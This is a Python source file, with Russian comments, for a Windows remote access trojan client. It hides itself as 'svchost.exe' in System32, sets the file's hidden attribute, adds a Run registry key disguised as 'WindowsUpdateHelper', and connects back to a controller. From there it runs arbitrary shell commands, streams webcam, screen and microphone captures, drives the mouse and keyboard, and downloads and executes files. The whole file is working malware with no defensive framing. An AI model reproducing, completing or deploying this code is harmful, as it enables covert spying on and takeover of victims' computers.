import socket
import pickle
import struct
import subprocess
import threading
import os
import sys
import ctypes
import winreg
import io
import time
import cv2
import pyaudio
import wave
import pynput.mouse as mouse
import pynput.keyboard as keyboard
from PIL import ImageGrab, Image
import numpy as np


class RATClient:
    def __init__(self, host='127.0.0.1', port=5555, proc_name='svchost.exe'):
        self.host = host
        self.port = port
        self.proc_name = proc_name
        self.running = True
        self.mic_stream = None
        self.mic_audio = None
        self.cam = None
        self.socket = None
        self.connected = False
        self.keyboard_controller = keyboard.Controller()
        self.mouse_controller = mouse.Controller()
        self.screen_streaming = False

        self.install_persistence()
        self.connect_with_retry()

    def install_persistence(self):
        """Скрытая установка в систему с заданным именем процесса"""
        if os.name != 'nt':
            return
        try:
            current_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            system_dir = os.path.join(os.environ['WINDIR'], 'System32', 'Tasks')
            if not os.path.exists(system_dir):
                system_dir = os.path.join(os.environ['WINDIR'], 'System32', 'spool', 'drivers', 'color')
            target_name = self.proc_name
            target_path = os.path.join(system_dir, target_name)
            if os.path.abspath(current_path).lower() == target_path.lower():
                return
            with open(current_path, 'rb') as src:
                with open(target_path, 'wb') as dst:
                    dst.write(src.read())
            ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateHelper", 0, winreg.REG_SZ, target_path)
            subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
        except:
            pass

    def connect_with_retry(self):
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(5)
                self.socket.connect((self.host, self.port))
                self.socket.settimeout(None)
                self.connected = True
                print(f"[+] Connected to {self.host}:{self.port}")
                self.handle_commands()
                break
            except Exception as e:
                print(f"[-] Connection failed: {e}, retrying in 5 seconds...")
                time.sleep(5)

    def recv_msg(self):
        try:
            raw_len = self.socket.recv(4)
            if not raw_len:
                return None
            msg_len = struct.unpack('!I', raw_len)[0]
            data = b''
            while len(data) < msg_len:
                chunk = self.socket.recv(min(4096, msg_len - len(data)))
                if not chunk:
                    break
                data += chunk
            return pickle.loads(data)
        except Exception as e:
            print(f"[-] Recv error: {e}")
            return None

    def send_response(self, resp):
        try:
            serialized = pickle.dumps(resp)
            length = struct.pack('!I', len(serialized))
            self.socket.send(length + serialized)
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            self.connected = False
            return False

    def handle_commands(self):
        while self.running and self.connected:
            try:
                msg = self.recv_msg()
                if msg is None:
                    print("[-] Lost connection to server")
                    self.connected = False
                    break

                cmd = msg['cmd']
                data = msg.get('data')
                print(f"[+] Received command: {cmd}")

                # Обработка каждой команды в отдельном потоке, чтобы не блокировать приём
                threading.Thread(target=self.process_command, args=(cmd, data), daemon=True).start()
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                self.connected = False
                break

        if self.running and not self.connected:
            self.cleanup()
            self.connect_with_retry()

    def process_command(self, cmd, data):
        """Обрабатывает команду в отдельном потоке"""
        try:
            if cmd == 'shell':
                try:
                    result = subprocess.run(data, shell=True, capture_output=True, text=True, timeout=30)
                    out = result.stdout + result.stderr
                    if not out:
                        out = '[OK]'
                    self.send_response(out)
                except subprocess.TimeoutExpired:
                    self.send_response('[TIMEOUT]')
                except Exception as e:
                    self.send_response(str(e))

            elif cmd == 'webcam_frame':
                try:
                    if self.cam is None:
                        self.cam = cv2.VideoCapture(0)
                        if not self.cam.isOpened():
                            self.send_response('NO_CAM')
                            return
                    ret, frame = self.cam.read()
                    if not ret:
                        self.send_response('NO_CAM')
                    else:
                        _, img_encoded = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                        self.send_response(img_encoded.tobytes())
                except Exception as e:
                    self.send_response(f'ERROR: {str(e)}')

            elif cmd == 'screen_frame':
                try:
                    screenshot = ImageGrab.grab()
                    screenshot = screenshot.resize((800, 600), Image.Resampling.LANCZOS)
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='JPEG', quality=50)
                    self.send_response(buffer.getvalue())
                except Exception as e:
                    self.send_response(f'ERROR: {str(e)}')

            elif cmd == 'mic_start':
                threading.Thread(target=self.start_mic, daemon=True).start()
                self.send_response('Recording started')

            elif cmd == 'mic_stop':
                self.stop_mic()
                self.send_response('Stopped')

            elif cmd == 'mouse_move':
                try:
                    x, y = data
                    self.mouse_controller.position = (x, y)
                    self.send_response('OK')
                except Exception as e:
                    self.send_response(str(e))

            elif cmd == 'mouse_click':
                try:
                    btn, pressed = data
                    button = mouse.Button.left if btn == 'left' else (
                        mouse.Button.right if btn == 'right' else mouse.Button.middle)
                    if pressed:
                        self.mouse_controller.press(button)
                    else:
                        self.mouse_controller.release(button)
                    self.send_response('OK')
                except Exception as e:
                    self.send_response(str(e))

            elif cmd == 'keyboard_type':
                try:
                    self.keyboard_controller.type(data)
                    self.send_response('OK')
                except Exception as e:
                    self.send_response(str(e))

            elif cmd == 'exec_file':
                try:
                    subprocess.Popen([data], shell=True)
                    self.send_response(f'Executed {data}')
                except Exception as e:
                    self.send_response(str(e))

            elif cmd == 'send_file':
                try:
                    file_data = data['content']
                    filename = data['name'] or 'temp.exe'
                    temp_dir = os.environ.get('TEMP', os.environ.get('TMP', '.'))
                    filepath = os.path.join(temp_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(file_data)
                    subprocess.Popen([filepath], shell=True)
                    self.send_response(f'File saved to {filepath} and executed')
                except Exception as e:
                    self.send_response(str(e))

            elif cmd == 'system_shutdown':
                subprocess.run('shutdown /s /t 5', shell=True)
                self.send_response('Shutting down in 5 seconds')

            elif cmd == 'system_reboot':
                subprocess.run('shutdown /r /t 5', shell=True)
                self.send_response('Rebooting in 5 seconds')

            elif cmd == 'system_logoff':
                subprocess.run('shutdown /l', shell=True)
                self.send_response('Logging off')

            elif cmd == 'system_hibernate':
                subprocess.run('shutdown /h', shell=True)
                self.send_response('Hibernating')

            elif cmd == 'system_sleep':
                subprocess.run('rundll32.exe powrprof.dll,SetSuspendState 0,1,0', shell=True)
                self.send_response('Sleeping')

            elif cmd == 'system_lock':
                ctypes.windll.user32.LockWorkStation()
                self.send_response('Workstation locked')

            else:
                self.send_response(f'Unknown command: {cmd}')
        except Exception as e:
            print(f"[-] Command processing error: {e}")
            try:
                self.send_response(f'ERROR: {str(e)}')
            except:
                pass

    def start_mic(self):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        try:
            self.mic_audio = pyaudio.PyAudio()
            self.mic_stream = self.mic_audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True,
                                                  frames_per_buffer=CHUNK)
            frames = []
            start_time = time.time()
            while self.mic_stream and self.mic_stream.is_active() and (time.time() - start_time) < 10:
                try:
                    data = self.mic_stream.read(CHUNK, exception_on_overflow=False)
                    frames.append(data)
                except:
                    break
            wav_io = io.BytesIO()
            wf = wave.open(wav_io, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(self.mic_audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            self.send_response(wav_io.getvalue())
            self.stop_mic()
        except Exception as e:
            self.send_response(f'MIC ERROR: {str(e)}')
            self.stop_mic()

    def stop_mic(self):
        if self.mic_stream:
            try:
                self.mic_stream.stop_stream()
                self.mic_stream.close()
            except:
                pass
            self.mic_stream = None
        if self.mic_audio:
            try:
                self.mic_audio.terminate()
            except:
                pass
            self.mic_audio = None

    def cleanup(self):
        if self.cam:
            try:
                self.cam.release()
            except:
                pass
            self.cam = None
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

    def run(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            self.cleanup()


if __name__ == '__main__':
    # Эти параметры будут заменены при сборке
    client = RATClient(host='127.0.0.1', port=5555, proc_name='svchost.exe')
    client.run()